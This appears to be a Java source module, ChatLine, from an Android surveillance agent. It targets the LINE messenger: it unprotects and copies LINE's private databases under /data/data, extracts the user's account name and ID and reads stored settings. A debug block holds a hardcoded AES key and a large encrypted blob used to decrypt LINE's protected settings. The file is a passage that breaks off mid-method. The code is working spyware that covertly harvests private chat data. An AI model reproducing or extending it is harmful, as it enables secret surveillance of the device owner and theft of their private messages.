package com.android.dvci.module.chat;

import android.database.Cursor;

import com.android.dvci.auto.Cfg;
import com.android.dvci.db.GenericSqliteHelper;
import com.android.dvci.db.RecordHashPairVisitor;
import com.android.dvci.db.RecordStringVisitor;
import com.android.dvci.db.RecordVisitor;
import com.android.dvci.file.Path;
import com.android.dvci.module.call.CallInfo;
import com.android.dvci.module.chat.line.Base64impl;
import com.android.dvci.module.chat.line.LineDecrypter;
import com.android.dvci.util.Check;
import com.android.dvci.util.PackageUtils;
import com.android.dvci.util.StringUtils;
import com.android.mm.M;

import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.Semaphore;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class ChatLine extends SubModuleChat {
	private static final String TAG = "ChatLine";

    private static final int PROGRAM = 0x0d;
	public static final int DECODED_VALUE = 0;
	private static PackageUtils.PInfo lastVersion=null;
	String pObserving = M.e("jp.naver.line.android");
    static String dbFile = M.e("/data/data/jp.naver.line.android/databases/naver_line");
    static String dbAccountFile = M.e("/data/data/jp.naver.line.android/databases/naver_line_myhome");
    Semaphore readChatSemaphore = new Semaphore(1, true);
    private Date lastTimestamp;
    private long lastLine;
    private static String account = "";
    private static String account_mid = M.e("mid");
	private static HashMap<String,String[]> settings = new HashMap<String, String[]>();
	public static final int ACCESS_CLEAR = 0;
	public static final int ACCESS_CRYPTED = 1;
	/* this hash map contains the line versions that has been installed throughall the agent
	 * life span. It keeps trace of navier_line_myhome.settings table access type.
	 * It can be crypted or not
	*/
	private static HashMap<String,Integer> access_db = new HashMap<String, Integer>();

    @Override
    public int getProgramId() {
        return PROGRAM;
    }

    @Override
    String getObservingProgram() {
        return pObserving;
    }

    @Override
    void notifyStopProgram(String processName) {
        start();
    }

    @Override
    protected void start() {
        if (!readChatSemaphore.tryAcquire()) {
            if (Cfg.DEBUG) {
                Check.log(TAG + " (readViberMessageHistory), semaphore red");
            }
            return;
        }
	    initVersion();
        try {

            lastLine = markup.unserialize(new Long(0));
            if (Cfg.DEBUG) {
                Check.log(TAG + " (start), read lastLine: " + lastLine);
            }

            Path.unprotect(dbAccountFile, 3, true);
	        GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbAccountFile);
            if (helper == null) {
                return;
            }
	        List<String> mymids= new ArrayList<String>();

			try {
				RecordStringVisitor visitor = new RecordStringVisitor("mid");
				helper.traverseRecords("my_home_status", visitor);
				mymids = visitor.getRecords();
			}finally{
				helper.disposeDb();
			}

            helper = GenericSqliteHelper.openCopy(dbFile);
	        if (helper == null) {
		        if (Cfg.DEBUG) {
			        Check.log(TAG + " (ChatLine) Error, file not readable: " + dbFile);
		        }
		        return;
	        }

			try {

				readSettings(helper);
				if(lastVersion != null && isVersionEncrypted(lastVersion.getVersionName())){
					account = getSetting(M.e("PROFILE_NAME"))!=null?getSetting(M.e("PROFILE_NAME")):"n/a";
					account_mid = getSetting(M.e("PROFILE_MID"))!=null?getSetting(M.e("PROFILE_MID")):"n/a";
				}else{
					account = readMyPhoneNumber(helper,mymids);
				}
				long lastmessage = readLineMessageHistory();
				if (lastmessage > lastLine) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (start) serialize: %d", lastmessage);
					}
					markup.serialize(lastmessage);
				}
				getCurrentCall(new CallInfo(false));
			}finally {
				helper.disposeDb();
			}

        } catch (Exception e) {
            if (Cfg.DEBUG) {
                Check.log(TAG + " (notifyStopProgram) Error: " + e);
            }
        } finally {
            readChatSemaphore.release();
        }

    }

	private boolean isVersionEncrypted(String pname) {
		return access_db.containsKey(pname) && access_db.get(pname) == ACCESS_CRYPTED;
	}
	public static void initVersion(){
		final ArrayList<PackageUtils.PInfo> apps = PackageUtils.getInstalledApps(false);
		for (PackageUtils.PInfo p : apps){
			if(p.getPname().equalsIgnoreCase(M.e("jp.naver.line.android"))){
				lastVersion = p;
				if (Cfg.DEBUG) {
					Check.log(TAG + " (initVersion) line version: " + p.getVersionName() );
				}
				break;
			}
		}
	}


	public static String getAccount() {
        if(account.equals("")){

            Path.unprotect(dbAccountFile, 3, true);
            GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbAccountFile);
            if (helper == null) {
                return null;
            }
            List<String> mymids= new ArrayList<String>();
            try {
                RecordStringVisitor visitor = new RecordStringVisitor("mid");
                helper.traverseRecords("my_home_status", visitor);

                mymids = visitor.getRecords();

            }finally{
                helper.disposeDb();
            }

            helper = GenericSqliteHelper.openCopy(dbFile);

            try {
                if (helper != null) {
                    if (Cfg.DEBUG) {
                        Check.log(TAG + " (ChatLine) Error, file not readable: " + dbFile);
                    }

                    account = readMyPhoneNumber(helper, mymids);
                }
            }finally{
                helper.disposeDb();
            }
        }
        return account;
    }

    static public String readMyPhoneNumber(GenericSqliteHelper helper, List<String> mymids) {

        RecordHashPairVisitor visitorContacts = new RecordHashPairVisitor("m_id", "name");
        helper.traverseRecords(M.e("contacts"), visitorContacts);

        for (String pmid : mymids) {
            if (!visitorContacts.containsKey(pmid)) {
                if (Cfg.DEBUG) {
                    Check.log(TAG + " (readMyPhoneNumber) found mid: %s", pmid);
                }
                account_mid = pmid;
                // break;
            }
        }

        RecordStringVisitor visitorContent = new RecordStringVisitor("content");
        visitorContent.selection = M.e("server_id is null");
        helper.traverseRecords(M.e("chat_history"), visitorContent);

        for (String content : visitorContent.getRecords()) {

            String[] lines = content.split("\n");
            for (int i = 0; i < lines.length; i += 3) {
                String mid = lines[i + 1];
                String name = lines[i + 2];
                if (!visitorContacts.containsKey(mid)) {
                    if (Cfg.DEBUG) {
                        Check.log(TAG + " (readMyPhoneNumber) my name is: %s, mid: %s", name, mid);
                        account = name;
                        if (!mid.equals(account_mid)) {
                            if (Cfg.DEBUG) {
                                Check.log(TAG + " (readMyPhoneNumber) Error: %s!=%s", mid, account_mid);
                            }
                        }
                        if (StringUtils.isEmpty(account_mid)) {
                            account_mid = mid;
                        }
                    }
                }
            }

        }

        return account;
    }
	static public void readSettings(GenericSqliteHelper helper) {
		/* First get line version and check encryption */
		String sqlquery = M.e("select s.key,s.value from setting as s ");

		if (Cfg.DEBUG) {
			try {
				String[] testBase64Impl={
						"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"
				};
				byte[] a = new byte[]{76, -86, -111, 47, -128, -21, 62, -44, 4, -91, 44, 60, 72, -46, 91, -42,
						-9, 46, -127, -110, -37, 85, -98, 73, -86, 27, -103, 103, -25, 81, 117, -89};
				SecretKeySpec v1 = new SecretKeySpec(a, "AES");
				Cipher v2 = Cipher.getInstance("AES/CBC/PKCS7Padding");
				v2.init(2, ((Key)v1), new IvParameterSpec(new byte[16]));  // decrypt
				for(String s : testBase64Impl) {
					Check.log(TAG + " (readSettings) testBaseImpl:  val: " + s );
